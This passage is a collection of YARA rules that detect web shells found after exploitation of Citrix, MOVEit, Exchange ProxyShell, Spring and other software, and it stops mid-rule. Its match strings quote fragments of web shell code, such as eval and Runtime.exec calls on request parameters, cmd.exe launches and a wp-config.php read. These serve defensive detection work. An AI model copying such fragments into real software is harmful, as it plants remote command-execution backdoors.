rule WEBSHELL_SECRETSAUCE_Jul23_1_RID2F7C : CVE_2023_3519 DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects SECRETSAUCE PHP webshells (found after an exploitation of Citrix NetScaler ADC CVE-2023-3519)"
      author = "Florian Roth"
      reference = "https://www.mandiant.com/resources/blog/citrix-zero-day-espionage"
      date = "2023-07-24 11:59:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2023_3519, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $sa1 = "for ($x=0; $x<=1; $x++) {" ascii
      $sa2 = "$_REQUEST[" ascii
      $sa3 = "@eval" ascii
      $sb1 = "public $cmd;" ascii
      $sb2 = "return @eval($a);" ascii
      $sb3 = "$z->run($z->get('openssl_public_decrypt'));" 
   condition: 
      filesize < 100KB and ( all of ( $sa* ) or 2 of ( $sb* ) )
}

rule WEBSHELL_ASPX_DLL_MOVEit_Jun23_1_RID3131 : DEMO EXE T1505_003 WEBSHELL {
   meta:
      description = "Detects compiled ASPX web shells found being used in MOVEit Transfer exploitation"
      author = "Florian Roth"
      reference = "https://www.trustedsec.com/blog/critical-vulnerability-in-progress-moveit-transfer-technical-analysis-and-recommendations/?utm_content=251159938&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306"
      date = "2023-06-01 13:12:01"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6cbf38f5f27e6a3eaf32e2ac73ed02898cbb5961566bb445e3c511906e2da1fa"
      tags = "DEMO, EXE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "human2_aspx" ascii fullword
      $x2 = "X-siLock-Comment" wide
      $x3 = "x-siLock-Step1" wide
      $a1 = "MOVEit.DMZ.Core.Data" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) and $a1 ) or all of them
}

rule WEBSHELL_ASPX_MOVEit_Jun23_1_RID2FF6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects ASPX web shells as being used in MOVEit Transfer exploitation"
      author = "Florian Roth"
      reference = "https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/"
      date = "2023-06-01 12:19:31"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5"
      hash2 = "48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a"
      hash3 = "e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "X-siLock-Comment" ascii fullword
      $s2 = "]; string x = null;" ascii
      $s3 = ";  if (!String.Equals(pass, " ascii
   condition: 
      filesize < 150KB and 2 of them
}

rule EXPL_POC_SpringCore_0day_Webshell_Mar22_1_RID35BB : DEMO EXPLOIT SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects webshell found after SpringCore exploitation attempts POC script"
      author = "Florian Roth"
      reference = "https://twitter.com/vxunderground/status/1509170582469943303"
      date = "2022-03-30 16:25:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ".getInputStream(); int a = -1; byte[] b = new byte[2048];" 
      $x2 = "if(\"j\".equals(request.getParameter(\"pwd\")" 
      $x3 = ".getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();" 
   condition: 
      filesize < 200KB and 1 of them
}

rule SUSP_WEBSHELL_ASPX_ProxyShell_Exploitation_Aug21_1_RID38F3 : DEMO SUSP T1505_003 WEBSHELL {
   meta:
      description = "Detects an indicator for unknown malicious loaders noticed in August 2021"
      author = "Florian Roth"
      reference = "https://twitter.com/VirITeXplorer/status/1430206853733097473"
      date = "2021-08-25 18:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-05-12"
      tags = "DEMO, SUSP, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ");eval/*asf" ascii
   condition: 
      filesize < 600KB and 1 of them
}

rule WEBSHELL_ASPX_ProxyShell_Aug21_3_RID31EC : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects webshells dropped by ProxyShell exploitation based on their file header (must be DER), size and content"
      author = "Max Altgelt"
      reference = "https://twitter.com/gossithedog/status/1429175908905127938?s=12"
      date = "2021-08-23 13:43:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Page Language=" ascii nocase
   condition: 
      uint16 ( 0 ) == 0x8230 and filesize < 10KB and $s1
}

rule WEBSHELL_ASPX_FileExplorer_Mar21_1_RID32A4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Chopper like ASPX Webshells"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2021-03-31 14:13:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "<span style=\"background-color: #778899; color: #fff; padding: 5px; cursor: pointer\" onclick=" ascii
      $xc1 = { 3C 61 73 70 3A 48 69 64 64 65 6E 46 69 65 6C 64
               20 72 75 6E 61 74 3D 22 73 65 72 76 65 72 22 20
               49 44 3D 22 ?? ?? ?? ?? ?? 22 20 2F 3E 3C 62 72
               20 2F 3E 3C 62 72 20 2F 3E 20 50 72 6F 63 65 73
               73 20 4E 61 6D 65 3A 3C 61 73 70 3A 54 65 78 74
               42 6F 78 20 49 44 3D } 
      $xc2 = { 22 3E 43 6F 6D 6D 61 6E 64 3C 2F 6C 61 62 65 6C
               3E 3C 69 6E 70 75 74 20 69 64 3D 22 ?? ?? ?? ??
               ?? 22 20 74 79 70 65 3D 22 72 61 64 69 6F 22 20
               6E 61 6D 65 3D 22 74 61 62 73 22 3E 3C 6C 61 62
               65 6C 20 66 6F 72 3D 22 ?? ?? ?? ?? ?? 22 3E 46
               69 6C 65 20 45 78 70 6C 6F 72 65 72 3C 2F 6C 61
               62 65 6C 3E 3C 25 2D 2D } 
      $r1 = "(Request.Form[" ascii
      $s1 = ".Text + \" Created!\";" ascii
      $s2 = "DriveInfo.GetDrives()" ascii
      $s3 = "Encoding.UTF8.GetString(FromBase64String(str.Replace(" ascii
      $s4 = "encodeURIComponent(btoa(String.fromCharCode.apply(null, new Uint8Array(bytes))));;" 
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) or 4 of them
}

rule WEBSHELL_ASPX_Chopper_Like_Mar21_1_RID3288 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Chopper like ASPX Webshells"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2021-03-31 14:09:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ac44513e5ef93d8cbc17219350682c2246af6d5eb85c1b4302141d94c3b06c90"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://f/<script language=\"JScript\" runat=\"server\">var _0x" ascii
      $s2 = "));function Page_Load(){var _0x" ascii
      $s3 = ";eval(Request[_0x" ascii
      $s4 = "','orange','unsafe','" ascii
   condition: 
      filesize < 3KB and 1 of them or 2 of them
}

rule WEBSHELL_ASPX_Mar21_1_RID2D74 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects ASPX Web Shells"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2021-03-12 10:32:31"
      score = 95
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "10b6e82125a2ddf3cc31a238e0d0c71a64f902e0d77171766713affede03174d"
      hash2 = "170bee832df176aac0a3c6c7d5aa3fee413b4572030a24c994a97e70f6648ffc"
      hash3 = "31c4d1fc81c052e269866deff324dffb215e7d481a47a2b6357a572a3e685d90"
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".StartInfo.FileName = 'cmd.exe';" ascii fullword
      $s2 = "<xsl:template match=\"\"/root\"\">" ascii fullword
      $s3 = "<?xml version=\"\"1.0\"\"?><root>test</root>\";" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 6KB and all of them
}

rule WEBSHELL_ASP_Embedded_Mar21_1_RID3085 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects ASP webshells"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2021-03-05 12:43:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<script runat=\"server\">" nocase
      $s2 = "new System.IO.StreamWriter(Request.Form[" 
      $s3 = ".Write(Request.Form[" 
   condition: 
      filesize < 100KB and all of them
}

rule APT_WEBSHELL_HAFNIUM_SecChecker_Mar21_1_RID33B3 : APT DEMO G0125 T1505_003 WEBSHELL {
   meta:
      description = "Detects HAFNIUM SecChecker webshell"
      author = "Florian Roth"
      reference = "https://twitter.com/markus_neis/status/1367794681237667840"
      date = "2021-03-05 14:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0"
      tags = "APT, DEMO, G0125, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "<%if(System.IO.File.Exists(\"c:\\\\program files (x86)\\\\fireeye\\\\xagt.exe" ascii
      $x2 = "\\csfalconservice.exe\")){Response.Write( \"3\");}%></head>" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 1KB and 1 of them or 2 of them
}

rule WEBSHELL_PHP_DEWMODE_UNC2546_Feb21_1_RID3187 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects DEWMODE webshells"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html"
      date = "2021-02-22 13:26:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7"
      hash2 = "5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "<font size=4>Cleanup Shell</font></a>';" ascii fullword
      $x2 = "$(sh /tmp/.scr)" 
      $x3 = "@system('sudo /usr/local/bin/admin.pl --mount_cifs=" ascii
      $s1 = "target=\\\"_blank\\\">Download</a></td>\";" ascii
      $s2 = ",PASSWORD 1>/dev/null 2>/dev/null');" ascii
      $s3 = ",base64_decode('" ascii
      $s4 = "include \"remote.inc\";" ascii
      $s5 = "@system('sudo /usr/local" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 9KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them
}

rule APT_WEBSHELL_PHP_Sandworm_May20_1_RID3214 : APT DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects GIF header PHP webshell used by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730"
      hash2 = "538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e"
      tags = "APT, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "GIF89a <?php $" ascii
      $s1 = "str_replace(" ascii
   condition: 
      filesize < 10KB and $h1 at 0 and $s1
}

rule WEBSHELL_ASPX_XslTransform_Aug21_RID3233 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects an ASPX webshell utilizing XSL Transformations"
      author = "Max Altgelt"
      reference = "https://gist.github.com/JohnHammond/cdae03ca5bc2a14a735ad0334dcb93d6"
      date = "2020-02-23 13:55:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $csharpshell = "Language=\"C#\"" nocase
      $x1 = "<root>1</root>" 
      $x2 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(" 
      $s1 = "XsltSettings.TrustedXslt" 
      $s2 = "Xml.XmlUrlResolver" 
      $s3 = "FromBase64String(Request[\"" 
   condition: 
      filesize < 500KB and $csharpshell and ( 1 of ( $x* ) or all of ( $s* ) )
}

rule APT_WebShell_Tiny_1_RID2DFE : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "eval(" ascii wide
   condition: 
      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 40 and $x1
}

rule APT_WebShell_AUS_Tiny_2_RID2F47 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 11:50:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0d6209d86f77a0a69451b0f27b476580c14e0cda15fa6a5003aab57a93e7e5a5"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Request.Item[System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"[password]\"))];" ascii
      $x2 = "eval(arguments,System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"" ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 1KB and 1 of them
}

rule APT_WebShell_AUS_JScript_3_RID3063 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 12:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7ac6f973f7fccf8c3d58d766dec4ab7eb6867a487aa71bc11d5f05da9322582d"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\"%><%try{eval(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String" ascii
      $s2 = ".Item[\"[password]\"])),\"unsafe\");}" ascii
   condition: 
      uint16 ( 0 ) == 0x6568 and filesize < 1KB and all of them
}

rule APT_WebShell_AUS_4_RID2D46 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:24:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "83321c02339bb51735fbcd9a80c056bd3b89655f3dc41e5fef07ca46af09bb71"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);" fullword ascii
      $s2 = "{return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(" ascii
      $s3 = ".Equals('User-Agent', StringComparison.OrdinalIgnoreCase))" ascii
      $s4 = "gen.Emit(System.Reflection.Emit.OpCodes.Ret);" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 10KB and 3 of them
}

rule APT_Script_AUS_4_RID2CA5 : APT DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a script involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 09:58:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fdf15f388a511a63fbad223e6edb259abdd4009ec81fcc87ce84f0f2024c8057"
      tags = "APT, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "myMutex = CreateMutex(0, 1, \"teX23stNew\")" fullword ascii
      $x2 = "mmpath = Environ(appdataPath) & \"\\\" & \"Microsoft\" & \"\\\" & \"mm.accdb\"" fullword ascii
      $x3 = "Dim mmpath As String, newmmpath  As String, appdataPath As String" fullword ascii
      $x4 = "'MsgBox \"myMutex Created\" Do noting" fullword ascii
      $x5 = "appdataPath = \"app\" & \"DatA\"" fullword ascii
      $x6 = ".DoCmd.Close , , acSaveYes" fullword ascii
   condition: 
      filesize < 7KB and 1 of them
}

rule APT_WebShell_AUS_5_RID2D47 : APT DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:25:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "54a17fb257db2d09d61af510753fd5aa00537638a81d0a8762a5645b4ef977e4"
      tags = "APT, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}" fullword ascii
      $a2 = "function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}" fullword ascii
      $s1 = "var hash=DEC(Request.Item['" ascii
      $s2 = "Response.Write(ENC(SET_ASS_SUCCESS));" fullword ascii
      $s3 = "hashtable[hash] = assCode;" fullword ascii
      $s4 = "Response.Write(ss);" fullword ascii
      $s5 = "var hashtable = Application[CachePtr];" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 2KB and 4 of them
}

rule Webshell_Tiny_ASP_Jan19_1_RID2FFF : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects a Tiny ASP webshell"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-01-16 12:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ddcae07ec497ea43ed38fcd6379b2a35776bc2e45b8c5b0267310e92ba3b30cc"
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Execute Request" ascii wide nocase
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 150 and 1 of them
}

rule WebShell_JexBoss_JSP_1_RID2F20 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects JexBoss JSPs"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-11-08 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "41e0fb374e5d30b2e2a362a2718a5bf16e73127e22f0dfc89fdb17acbe89efdf"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "equals(\"jexboss\")" 
      $x2 = "%><pre><%if(request.getParameter(\"ppp\") != null &&" ascii
      $s1 = "<%@ page import=\"java.util.*,java.io.*\"%><pre><% if (request.getParameter(\"" 
      $s2 = "!= null && request.getHeader(\"user-agent\"" ascii
      $s3 = "String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 1KB and 1 of ( $x* ) or 2 of them
}

rule WebShell_JexBoss_WAR_1_RID2F1D : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects JexBoss versions in WAR form"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-11-08 11:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6271775ab144ce9bb9138bf054b149b5813d3beb96338993c6de35330f566092"
      hash2 = "6f14a63c3034d3762da8b3ad4592a8209a0c88beebcb9f9bd11b40e879f74eaf"
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $ = "jbossass" fullword ascii
      $ = "jexws.jsp" fullword ascii
      $ = "jexws.jspPK" fullword ascii
      $ = "jexws1.jsp" fullword ascii
      $ = "jexws1.jspPK" fullword ascii
      $ = "jexws2.jsp" fullword ascii
      $ = "jexws2.jspPK" fullword ascii
      $ = "jexws3.jsp" fullword ascii
      $ = "jexws3.jspPK" fullword ascii
      $ = "jexws4.jsp" fullword ascii
      $ = "jexws4.jspPK" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 4KB and 1 of them
}

rule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1_RID3580 : APT DEMO FILE NK OBFUS T1505_003 WEBSHELL {
   meta:
      description = "Detects malware from NK APT incident DE"
      author = "Florian Roth"
      reference = "Internal Research - ON"
      date = "2017-11-17 16:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2020-07-31"
      hash1 = "ed6e2e0027d3f564f5ce438984dc8a54577df822ce56ce079c60c99a91d5ffb1"
      tags = "APT, DEMO, FILE, NK, OBFUS, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Obfuscation provided by FOPO" fullword ascii
      $s1 = "\";@eval($" ascii
      $f1 = { 22 29 29 3B 0D 0A 3F 3E } 
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 800KB and ( $x1 or ( $s1 in ( 0 .. 350 ) and $f1 at ( filesize - 23 ) ) )
}

rule ALFA_SHELL_RID29FC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects web shell often used by Iranian APT groups"
      author = "Florian Roth"
      reference = "http://getalfa.rf.gd/?i=1"
      date = "2017-09-21 02:45:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a39d8823d54c55e60a7395772e50d116408804c1a5368391a1e5871dbdc83547"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
      $x2 = "#solevisible@gmail.com" fullword ascii
      $x3 = "'login_page' => '500',//gui or 500 or 403 or 404" fullword ascii
      $x4 = "$GLOBALS['__ALFA__']" fullword ascii
      $x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
      $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A } 
   condition: 
      ( filesize < 900KB and 2 of ( $x* ) or $f1 at ( filesize - 22 ) )
}

rule PAS_Webshell_Encoded_RID2E9B : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects a PAS webshell"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2017/07/the-medoc-connection.html"
      date = "2017-07-11 11:21:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $head1 = "<?php $____=" fullword ascii
      $head2 = "'base'.(32*2).'" 
      $enc1 = "isset($_COOKIE['___']" ascii
      $enc2 = "if($___!==NULL){" ascii
      $enc3 = ").substr(md5(strrev($" ascii
      $enc4 = "]))%256);$" ascii
      $enc5 = "]))@setcookie('" ascii
      $enc6 = "]=chr(( ord($_" ascii
      $x1 = { 3D 0A 27 29 29 3B 69 66 28 69 73 73 65 74 28 24 5F 43 4F 4F 4B 49 45 5B 27 } 
      $foot1 = "value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>" 
      $foot2 = "();}} @header(\"Status: 404 Not Found\"); ?>" 
   condition: 
      ( uint32 ( 0 ) == 0x68703f3c and filesize < 80KB and ( 3 of them or $head1 at 0 or $head2 in ( 0 .. 20 ) or 1 of ( $x* ) ) ) or $foot1 at ( filesize - 52 ) or $foot2 at ( filesize - 44 )
}

rule Wordpress_Config_Webshell_Preprend_RID34C3 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-06-25 15:44:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = " * @package WordPress" fullword ascii
      $s1 = "define('DB_NAME'," ascii
      $s2 = "require_once(ABSPATH . 'wp-settings.php');" ascii
      $fp1 = "iThemes Security Config" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and filesize < 400KB and $x1 and all of ( $s* ) and not $x1 in ( 0 .. 1000 ) and not 1 of ( $fp* )
}

rule PHP_Webshell_1_Feb17_RID2DF2 : ANOMALY DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a simple cloaked PHP web shell"
      author = "Florian Roth"
      reference = "https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127"
      date = "2017-02-28 10:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "ANOMALY, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "<?php ${\"\\x" ascii
      $x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
      $x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
      $x3 = "]}[\"\x64\"]);}}echo " ascii
      $x4 = "\"=>@phpversion(),\"\\x" ascii
      $s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
      $s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them
}

rule Nishang_Webshell_RID2D6E : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a ASPX web shell"
      author = "Florian Roth"
      reference = "https://github.com/samratashok/nishang"
      date = "2016-09-11 10:31:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" ascii
      $s2 = "output.Text += \"\nPS> \" + console.Text + \"\n\" + do_ps(console.Text);" ascii
      $s3 = "<title>Antak Webshell</title>" fullword ascii
      $s4 = "<asp:Button ID=\"executesql\" runat=\"server\" Text=\"Execute SQL Query\"" ascii
   condition: 
      ( uint16 ( 0 ) == 0x253C and filesize < 100KB and 1 of ( $s* ) )
}

rule UploadShell_98038f1efa4203432349badabad76d44337319a6_RID3657 : DEMO FILE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "506a6ab6c49e904b4adc1f969c91e4f1a7dde164be549c6440e766de36c93215"
      tags = "DEMO, FILE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
      $s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
